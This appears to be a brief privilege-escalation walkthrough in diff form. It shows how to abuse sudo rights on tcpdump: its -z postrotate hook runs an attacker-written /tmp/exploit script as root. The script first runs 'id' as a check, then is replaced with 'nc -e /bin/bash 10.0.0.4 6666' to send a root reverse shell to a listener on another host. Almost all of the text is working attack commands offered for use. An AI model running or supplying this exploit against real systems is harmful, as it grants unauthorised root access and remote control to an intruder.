@@ -1,0 +1,19 @@
+[fireman@localhost ~]$ touch /tmp/exploit
+
+[fireman@localhost ~]$ chmod +x /tmp/exploit
+
+[fireman@localhost ~]$ echo "id" > /tmp/exploit
+
+To check...
+
+sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
+
+this will show you just output ...
+
+to get root shell...
+
+execute this command and start listener befor doing this..
+
+[fireman@localhost ~]$ echo "nc -e /bin/bash 10.0.0.4 6666" > /tmp/exploit
+echo "nc -e /bin/bash 10.0.0.4 6666" > /tmp/exploit
+[fireman@localhost ~]$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/exploit -Z root
